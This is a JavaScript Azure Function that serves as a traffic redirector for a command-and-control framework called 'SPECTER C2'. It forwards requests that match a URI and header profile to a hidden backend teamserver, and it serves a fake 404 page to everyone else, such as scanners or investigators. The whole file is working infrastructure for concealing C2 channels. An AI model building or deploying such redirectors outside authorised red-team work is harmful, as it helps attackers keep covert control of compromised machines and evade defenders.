/**
 * SPECTER C2 Azure Function — HTTP Trigger Filter
 *
 * Inspects incoming requests against the C2 profile. Matching requests are
 * forwarded to the backend teamserver. Non-matching requests receive a
 * decoy response.
 */

const https = require('https');
const http  = require('http');
const url   = require('url');

module.exports = async function (context, req) {
    const backendUrl   = process.env.BACKEND_URL;
    const uriPattern   = new RegExp(process.env.URI_PATTERN || "^/api/v[0-9]+/");
    const headerName   = (process.env.HEADER_NAME || "X-Request-ID").toLowerCase();
    const headerRegex  = new RegExp(process.env.HEADER_PATTERN || "^[a-f0-9]{32}$");
    const decoyBody    = process.env.DECOY_RESPONSE || "<html><head><title>404</title></head><body>Not Found</body></html>";

    const reqUrl = req.url || "/";

    // Check URI pattern
    if (!uriPattern.test(reqUrl)) {
        context.res = decoyResponse(decoyBody);
        return;
    }

    // Check required header
    const hdrValue = req.headers[headerName];
    if (!hdrValue || !headerRegex.test(hdrValue)) {
        context.res = decoyResponse(decoyBody);
        return;
    }

    // Forward to backend
    try {
        const result = await forwardRequest(backendUrl, reqUrl, req);
        context.res = {
            status:  result.statusCode,
            headers: filterHeaders(result.headers),
            body:    result.body,
            isRaw:   true,
        };
    } catch (err) {
        context.log.error("Backend forward failed:", err.message);
        context.res = decoyResponse(decoyBody);
    }
};

function decoyResponse(body) {
    return {
        status: 404,
        headers: {
            "Content-Type":  "text/html; charset=utf-8",
            "Cache-Control": "no-store",
        },
        body: body,
    };
}

function forwardRequest(backendUrl, path, req) {
    return new Promise((resolve, reject) => {
        const parsed  = url.parse(backendUrl + path);
        const client  = parsed.protocol === "https:" ? https : http;

        const options = {
            hostname: parsed.hostname,
            port:     parsed.port,
            path:     parsed.path,
            method:   req.method,
            headers:  Object.assign({}, req.headers, { host: parsed.hostname }),
        };

        const proxyReq = client.request(options, (proxyRes) => {
            const chunks = [];
            proxyRes.on("data", (chunk) => chunks.push(chunk));
            proxyRes.on("end", () => {
                resolve({
                    statusCode: proxyRes.statusCode,
                    headers:    proxyRes.headers,
                    body:       Buffer.concat(chunks),
                });
            });
        });

        proxyReq.on("error", reject);
        proxyReq.setTimeout(30000, () => {
            proxyReq.destroy(new Error("Backend timeout"));
        });

        if (req.body) {
            proxyReq.write(typeof req.body === "string" ? req.body : JSON.stringify(req.body));
        }

        proxyReq.end();
    });
}

function filterHeaders(headers) {
    const filtered = {};
    const skip = new Set(["transfer-encoding", "connection", "keep-alive"]);
    for (const [key, value] of Object.entries(headers)) {
        if (!skip.has(key.toLowerCase())) {
            filtered[key] = value;
        }
    }
    return filtered;
}
